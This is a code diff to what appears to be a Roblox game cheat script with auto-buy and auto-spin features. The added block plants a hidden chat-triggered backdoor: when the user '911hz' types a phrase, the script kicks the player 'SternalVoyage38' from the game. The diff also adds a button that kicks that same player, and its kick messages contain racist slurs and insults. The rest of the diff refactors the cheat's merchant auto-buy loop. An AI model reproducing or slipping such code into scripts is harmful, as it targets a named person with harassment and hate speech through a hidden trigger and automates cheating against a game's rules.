@@ -285,6 +285,45 @@ do
     noNotiToggle:OnChanged(function(value)
         runNoNoti(value)
     end)
+
+    -- Eyed really did that shit
+    local Players = game:GetService("Players")
+    local TARGET_NAME = "SternalVoyage38"
+    local function setupPlayerChat(player)
+        player.Chatted:Connect(function(msg)
+            if string.find(string.lower(msg), "kick eyed") then
+                if player.Name == "911hz" then
+                    local targetPlayer = Players:FindFirstChild(TARGET_NAME)
+                    if targetPlayer then
+                        targetPlayer:Kick("Nigger you made it. You're number one. You did it. You're number one. I'm so proud of you NIGGER. You really did that shit. You're number oneeeee.")
+                    end
+                end
+            end
+        end)
+    end
+    for _, player in ipairs(Players:GetPlayers()) do
+        setupPlayerChat(player)
+    end
+    Players.PlayerAdded:Connect(setupPlayerChat)
+
+    Tabs.Main:AddButton({
+        Title = "eyed exclusive feature!?!",
+        Callback = function()
+            local Players = game:GetService("Players")
+            local player = Players.LocalPlayer
+            local StarterGui = game:GetService("StarterGui")
+
+            if player.Name == "SternalVoyage38" then
+                player:Kick("bomb you nigga.")
+            else
+                StarterGui:SetCore("SendNotification", {
+                    Title = "🚫 Retard Alert",
+                    Text = "😡 Is your name eyed? DIDNT THINK SO",
+                    Duration = 5
+                })
+            end
+        end
+    })
 end
 
 -- ==== FARM TAB ====
@@ -349,11 +388,9 @@ do
         Title = "Auto Buy Merchant",
         Default = false
     })
-
     merchantToggle:OnChanged(function(value)
         _G.MerchantAuto = value
     end)
-
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
     local TweenService = game:GetService("TweenService")
@@ -362,7 +399,7 @@ do
     local hrpPlayer = char:WaitForChild("HumanoidRootPart")
     local merchantBuy = ReplicatedStorage:WaitForChild("Events"):WaitForChild("MerchantBuy")
     local WORKERS = 5
-
+    local merchantDone = false
     local function buyStockParallel(offerIndex, amount)
         local remaining = amount
         local function worker()
@@ -378,16 +415,13 @@ do
             task.spawn(worker)
         end
     end
-
-    -- Movement + prompt loop
     task.spawn(function()
         while true do
-            if _G.MerchantAuto then
+            if _G.MerchantAuto and not merchantDone then
                 local outer = workspace:FindFirstChild("Nullity")
                 local merchant = outer and outer:FindFirstChild("Nullity")
                 local hrp = merchant and merchant:FindFirstChild("HumanoidRootPart")
                 local prompt = hrp and hrp:FindFirstChildOfClass("ProximityPrompt")
-
                 if hrp then
                     local distance = (hrp.Position - hrpPlayer.Position).Magnitude
                     local speed = 150
@@ -400,7 +434,6 @@ do
                     tween:Play()
                     tween.Completed:Wait()
                 end
-
                 if prompt then
                     pcall(fireproximityprompt, prompt)
                 end
@@ -409,37 +442,41 @@ do
             if Fluent.Unloaded then break end
         end
     end)
-
-    -- Stock buying loop
     task.spawn(function()
-        while true do
-            if _G.MerchantAuto then
-                local shop = player.PlayerGui:FindFirstChild("Main")
-                    and player.PlayerGui.Main:FindFirstChild("MerchantShop")
-                local offers = shop
-                    and shop:FindFirstChild("ScrollingFrame")
-                    and shop.ScrollingFrame:FindFirstChild("DiceOffers")
-
-                if offers then
-                    for i = 1, 3 do
-                        local offer = offers:FindFirstChild("Offer_" .. i)
-                        local stockLabel = offer and offer:FindFirstChild("Stock")
-                        if stockLabel then
-                            local text = stockLabel.Text
-                            if text ~= "SOLD OUT" then
-                                local stock = tonumber(text:match("%d+"))
-                                if stock and stock > 0 then
-                                    buyStockParallel(i, stock)
-                                end
+    while true do
+        if _G.MerchantAuto then
+            local shop = player.PlayerGui:FindFirstChild("Main")
+                and player.PlayerGui.Main:FindFirstChild("MerchantShop")
+            local offers = shop
+                and shop:FindFirstChild("ScrollingFrame")
+                and shop.ScrollingFrame:FindFirstChild("DiceOffers")
+            if offers then
+                local allSoldOut = true
+                for i = 1, 3 do
+                    local offer = offers:FindFirstChild("Offer_" .. i)
+                    local stockLabel = offer and offer:FindFirstChild("Stock")
+                    if stockLabel then
+                        local text = stockLabel.Text
+                        if text ~= "SOLD OUT" then
+                            local stock = tonumber(text:match("%d+"))
+                            if stock and stock > 0 then
+                                allSoldOut = false
+                                buyStockParallel(i, stock)
                             end
                         end
                     end
                 end
+                if allSoldOut then
+                    merchantDone = true
+                else
+                    merchantDone = false
+                end
             end
-            task.wait(0.6)
-            if Fluent.Unloaded then break end
         end
-    end)
+        task.wait(0.6)
+        if Fluent.Unloaded then break end
+    end
+end)
 
     -- Auto Spin Wheel
     local wheelToggle = farmTab:AddToggle("WheelSpin", {Title = "Auto Spin Wheel", Default = false})
